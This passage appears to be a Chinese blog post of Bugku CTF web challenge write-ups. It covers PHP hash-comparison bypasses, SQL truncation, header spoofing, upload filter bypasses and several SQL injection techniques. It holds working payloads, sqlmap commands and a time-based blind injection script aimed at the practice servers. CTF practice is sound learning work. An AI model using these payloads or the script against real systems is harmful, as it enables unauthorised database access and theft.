+<p><strong>{4,7} 表示前面的字符要匹配4-7次</strong></p>
+<p><strong>/ 表示 / ,</strong></p>
+<p><strong>[a-z] 表示在a-z中匹配</strong></p>
+<p><strong>[[:punct:] ]表示任意匹配标点符号</strong></p>
+<p><strong>i 表示大小写不敏感</strong></p>
+<p><strong>于是  ?id=key1keykeykey11111key:/1/1keya,</strong></p>
+<p><strong>正则参考链接[link]https://www.cnblogs.com/afarmer/archive/2011/08/29/2158860.html</strong></p>
+<hr>
+<h4 id="前女友skctf"><strong>前女友(SKCTF)</strong></h4>
+<p><strong>题目链接</strong></p>
+<p><strong>[bugku]http://123.206.31.85:49162/index.php</strong></p>
+<p><strong>查看源码发现code.txt,打开发现一段代码</strong></p>
+<pre><code class="language-php">&lt;?php
+if(isset($_GET['v1']) &amp;&amp; isset($_GET['v2']) &amp;&amp; isset($_GET['v3'])){
+    $v1 = $_GET['v1'];
+    $v2 = $_GET['v2'];
+    $v3 = $_GET['v3'];
+    if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2)){
+        if(!strcmp($v3, $flag)){ 
+         	//返回值：如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。
+            echo $flag;
+        }
+    }
+}
+?&gt;
+</code></pre>
+<p><strong>代码意思是v1和v2本身不相等,但是md5值相等进入循环,v3值和flag值相等输出flag</strong></p>
+<p><strong>php黑魔法,参考链接[link]http://www.cnblogs.com/xishaonian/p/7628152.html</strong></p>
+<p>v1=240610708 &amp;v2=QNKCDZO</p>
+<p><strong>strcmp()可以利用数组绕过既可以 v3[]=a</strong></p>
+<p><strong>最后构造 ?v1=240610708&amp;v2=QNKCDZO&amp;v3[]=1</strong></p>
+<hr>
+<h4 id="login1skctf"><strong>login1(SKCTF)</strong></h4>
+<p><strong>题目链接</strong></p>
+<p><strong>[bugku]http://123.206.31.85:49163/</strong></p>
+<p><strong>打开链接给了个用户登录注册界面,注册号,登录成功显示&quot;你不是管理员&quot; cookies没东西</strong></p>
+<p><strong>题目提示了sql约束攻击</strong></p>
+<p><strong>sql约束攻击:</strong></p>
+<p><strong>数据库字符串比较,在数据库对字符串进行比较时,如果两个字符的长度不一样,则会将较短的字符串末尾填充空格,使两个字符串的长度一致.</strong></p>
+<p><strong>比如</strong></p>
+<pre><code class="language-sql">select * from admin where username='vampire'
+select * from admin where username='vampire        '
+</code></pre>
+<p><strong>第一段代码和第二段代码查询结果一样,会把空格处理掉0.0</strong></p>
+<p><strong>利用这一点,可以用admin  注册将admin的密码重置,登录admin账号得到flag</strong></p>
+<hr>
+<h4 id="你从哪里来"><strong>你从哪里来</strong></h4>
+<p><strong>题目链接</strong></p>
+<p><strong>[bugku]http://123.206.87.240:9009/from.php</strong></p>
+<p><strong>打开链接</strong></p>
+<p><strong>are you from google?</strong></p>
+<p><strong>修改header头</strong></p>
+<p><strong>添加 https://www.google.com 得到flag</strong></p>
+<hr>
+<h4 id="md5-collisionnupt_ctf"><strong>md5 collision(NUPT_CTF)</strong></h4>
+<p><strong>题目链接</strong></p>
+<p><strong>[bugku]http://123.206.87.240:9009/md5.php</strong></p>
+<p><strong>打开链接 input a,题目名字又是md5碰撞</strong></p>
+<p><strong>所以就想到hash值以0e开头的字符串0.0</strong></p>
+<p><strong>于是构造?a=s214587387a</strong></p>
+<hr>
+<h4 id="程序员本地网站"><strong>程序员本地网站</strong></h4>
+<p><strong>题目链接</strong></p>
+<p><strong>[bugku]http://123.206.87.240:8002/localhost/</strong></p>
+<p><strong>本地访问,利用X-Forwarded-For伪造ip为127.0.0.1得到flag</strong></p>
+<hr>
+<h4 id="各种绕过"><strong>各种绕过</strong></h4>
+<p><strong>题目链接</strong></p>
+<p><strong>[bugku]http://123.206.87.240:8002/web7/</strong></p>
+<p><strong>打开链接</strong></p>
+<pre><code class="language-php">&lt;?php
+highlight_file('flag.php');
+$_GET['id'] = urldecode($_GET['id']);//url解密
+$flag = 'flag{xxxxxxxxxxxxxxxxxx}';
+if (isset($_GET['uname']) and isset($_POST['passwd'])) {
+    if ($_GET['uname'] == $_POST['passwd'])
+        print 'passwd can not be uname.';
+    else if (sha1($_GET['uname']) === sha1($_POST['passwd'])&amp;($_GET['id']=='margin'))
+        die('Flag: '.$flag);
+    else
+        print 'sorry!';
+} 
+</code></pre>
+<p><strong>代码意思,uname和passwd的值不同,但是sha值相同,===可以用数组绕过</strong></p>
+<p><strong>id==margin,url解密margin所以只需id=margin即可</strong></p>
+<p><strong>构造?uname[]=a&amp;id=margin           post    passwd[]=b</strong></p>
+<hr>
+<h4 id="web8"><strong>web8</strong></h4>
+<p><strong>题目链接</strong></p>
+<p><strong>[bugku]http://123.206.87.240:8002/web8/</strong></p>
+<pre><code>&lt;?php
+extract($_GET);//变量覆盖
+if (!empty($ac))
+{
+$f = trim(file_get_contents($fn));//读取文件
+if ($ac === $f)
+{
+echo &quot;&lt;p&gt;This is flag:&quot; .&quot; $flag&lt;/p&gt;&quot;;
+}
+else
+{
+echo &quot;&lt;p&gt;sorry!&lt;/p&gt;&quot;;
+}
+}
+?&gt;
+</code></pre>
+<p><strong>extract() -使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量.</strong></p>
+<p><strong>empty()-判断一个变量是否被认为是空的。当一个变量并不存在，或者它的值等同于FALSE，那么它会被认为不存在。如果变量不存在的话，empty()并不会产生警告。</strong></p>
+<p><strong>trim()-移除字符串两侧的空白字符或其他预定义字符。</strong></p>
+<p><strong>file_get_contents-将整个文件读入一个字符串</strong></p>
+<p><strong>于是构造?ac=a&amp;fn=php://input  post上传a</strong></p>
+<hr>
+<h4 id="细心"><strong>细心</strong></h4>
+<p><strong>题目链接</strong></p>
+<p><strong>[bugku]http://123.206.87.240:8002/web13/</strong></p>
+<p><strong>robots.txt下面有resusl.php</strong></p>
+<p><strong>打开resusl.php,你不是管理员,但是有段代码</strong></p>
+<pre><code class="language-php">if ($_GET[x]==$password)
+</code></pre>
+<p><strong>于是构造?x=admin,得到flag</strong></p>
+<hr>
+<h4 id="求getshell"><strong>求getshell</strong></h4>
+<p><strong>题目链接</strong></p>
+<p><strong>[bugku]http://123.206.87.240:8002/web9/index.php</strong></p>
+<p><strong>上传一句话抓包</strong></p>
+<figure data-type="image" tabindex="5"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/bugku/6.png" alt="" loading="lazy"></figure>
+<p>1.判断第一个绕过点在请求头中的content-type上，因此通过大小写进行绕过（multipart/form-data 是上传文件时使用的格式）</p>
+<p>2.第二个绕过点在 上传文件的后缀名上,php5没有被过滤</p>
+<hr>
+<h4 id="insert-into注入"><strong>INSERT INTO注入</strong></h4>
+<p><strong>题目链接</strong></p>
+<p><strong>[bugku][http://123.206.87.240:8002/web15/</strong></p>
+<pre><code>error_reporting(0);
+
+function getIp(){
+	$ip = '';
+	if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])){ //先让ip=xff
+		$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+	}else{
+		$ip = $_SERVER['REMOTE_ADDR'];
+	}
+	$ip_arr = explode(',', $ip); //将ip用，隔开成几个数组
+	return $ip_arr[0];//返回第一个数组，大概就是只返回 ，前的数据
+
+}
+
+$host=&quot;localhost&quot;;
+$user=&quot;&quot;;
+$pass=&quot;&quot;;
+$db=&quot;&quot;;
+
+$connect = mysql_connect($host, $user, $pass) or die(&quot;Unable to connect&quot;);
+
+mysql_select_db($db) or die(&quot;Unable to select database&quot;);
+
+$ip = getIp();
+echo 'your ip is :'.$ip;
+$sql=&quot;insert into client_ip (ip) values ('$ip')&quot;; //注入点
+mysql_query($sql);
+</code></pre>
+<p><strong>第10行代码将 ，号后面的字符截断了，意味不能使用if，所以用这一句</strong></p>
+<pre><code class="language-sql">select case when A then B else C end;
+//当A为真时就执行B，否则执行C
+</code></pre>
+<p><strong>因为，号过滤，所以substr(start,end)和substring也不能用了，但是这里有个小技巧就是使用from 1 for 1代替</strong></p>
+<pre><code>'+(select case when substr((select flag from flag) from 1 for 1)='a' then sleep(5) else 0 end))%23
+</code></pre>
+<p><strong>substr()函数参考链接[]:http://www.cnblogs.com/ahu-lichang/p/9494909.html</strong></p>
+<p><strong>网上找的脚本，没跑出来....</strong></p>
+<p><strong>感觉题目出了问题...</strong></p>
+<pre><code class="language-python"># -*- coding:utf-8 -*-
+import requests
+import sys
+
+sql = &quot;127.0.0.1'+(select case when substr((select flag from flag) from {0} for 1)=‘{1}‘ then sleep(5) else 0 end))--+&quot;
+url = 'http://123.206.87.240:8002/web15/'
+flag = &quot;&quot;
+for i in range(1,50):
+    # 怀疑flag有40个那么长，所以以40为长度进行猜测
+    print('正在猜测:',str(i))
+    # 把i变成字符串格式输出出来
+    for ch in range(33,129):
+        print(ch)
+        # 遍历整个acsii码表
+        if ch &gt;= 128:
+            sys.exit(0)
+            # 如果都跑都这儿了，说明有问题了，程序退出
+        sqli = sql.format(i,chr(ch))
+        # format是格式化输出语句，i给到sql语句的{0}位置，chr(ch)给到{1}的位置。（chr()的作用是根据acsii码值返回对应的字符）
+        print(sqli)
+        header = {
+            'X-Forwarded-For':sqli
+            # 每次去伪造不同的ip（注入命令）嘛
+        }
+        try:
+            html = requests.get(url, headers=header, timeout=4)
+        # 大部分的情况肯定是猜错了，如果错了（等待超过三秒）,那就继续循环；
+        # 如果对了(对脚本来说属于异常)，那就跳到异常
+        except:
+            flag += chr(ch)
+            print(flag)
+            break
+</code></pre>
+<hr>
+<h4 id="这是一个神奇的登陆框"><strong>这是一个神奇的登陆框</strong></h4>
+<p><strong>题目链接</strong></p>
+<p><strong>[bugku][http://123.206.87.240:9001/sql/</strong></p>
+<p><strong>打开链接就一个登录框，发现 “ 引起注入，于是抓包用sqlmap</strong></p>
+<pre><code class="language-sql">sqlmap -r &quot;/home/deepin/Desktop/22.txt&quot; -p admin_name --dbs //获取数据库
+sqlmap -r &quot;/home/deepin/Desktop/22.txt&quot; -D bugkusql1 -p admin_name --tables // 获取列表
+sqlmap -r &quot;/home/deepin/Desktop/22.txt&quot; -T flag1 -p admin_name --columns //获取字段
+sqlmap -r &quot;/home/deepin/Desktop/22.txt&quot; -D bugkusql1 -T flag1 -C flag1 -p admin_name --dump //打印字段
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/bugku/7.png" alt="" loading="lazy"></figure>
+<hr>
+<h4 id="多次"><strong>多次</strong></h4>
+<p><strong>题目地址</strong></p>
+<p><strong>[bugku][http://123.206.87.240:9004/1ndex.php?id=1</strong></p>
+<p><strong>加 ' 报错，字符型注入，</strong></p>
+<p><strong>id=1' and 1=1 %23 报错，说明有过滤</strong></p>
+<p><strong>异或注入 用 ^ 测试过滤字符，两个条件相同（同真或同假）即为假.</strong></p>
+<p><strong>id=1' ^ (0) %23 正确</strong></p>
+<p><strong>id=1’ ^ (1) %23 错误</strong></p>
+<p><strong>因此 id=1'^(length('and')!=0)%23 如果and被过滤，那么length('and')==0 和!=0矛盾返回0，所以页面应该返回真确</strong></p>
+<p><strong>用同样的方法测试了or，union，select都被过滤.</strong></p>
+<p><strong>后面发现双写能绕过</strong></p>
+<p><strong>id=-1' ununionion seselectlect 1,2%23 发现2有回显.</strong></p>
+<pre><code class="language-sql">//爆表
+id=-1' ununionion seselectlect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=&quot;web1002-1&quot; %23
+//爆列
+id=-1' ununionion seselectlect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name=&quot;flag1&quot; %23
+//爆内容
+id=-1' ununionion seselectlect 1,group_concat(flag1) from flag1 %23
+
+//得到usOwycTju+FTUUzXosjr ，是个假flag
+//于是继续爆破
+id=-1' ununionion seselectlect 1,group_concat(address) from flag1 %23
+//得到下一关地址 ./Once_More.php
+</code></pre>
+<p><strong>第二关，开始很正常，后面发现union 就开始被过滤了. 双写绕过union，但是select双写绕过没起作用，应该是被吃掉了.</strong></p>
+<p><strong>于是这里应该有两种思路：</strong></p>
+<pre><code>基于extractvalue()和updatexml()的报错注入
+id=1'and updatexml(1,concat(&quot;~&quot;,(select database())),1)%23
+id=1'and extractvalue(1,concat(&quot;~&quot;,(select database())))%23
+</code></pre>
+<p><strong>extractvalue报错注入</strong></p>
+<p><strong>参考链接[]https://blog.csdn.net/dyw_666666/article/details/83450701</strong></p>
+<p><strong>updatexml报错注入</strong></p>
+<p><strong>参考链接[]https://blog.csdn.net/qq_26090065/article/details/82708691</strong></p>
+<p><strong>第二种思路就是盲注了</strong></p>
+<pre><code class="language-mysql">这个题substr函数被过滤了，mid这个函数没有被过滤(mid使用方法与substr一样)，于是将substr替换为mid
+</code></pre>
+<p><strong>盲注</strong></p>
+<p><strong>参考链接[]https://blog.csdn.net/qingchenldl/article/details/84576351</strong></p>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://www.yyxyy.xyz/post/hello-gridea/">
+                  <h3 class="post-title">
+                    Hello Gridea
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+
+  </body>
+</html>
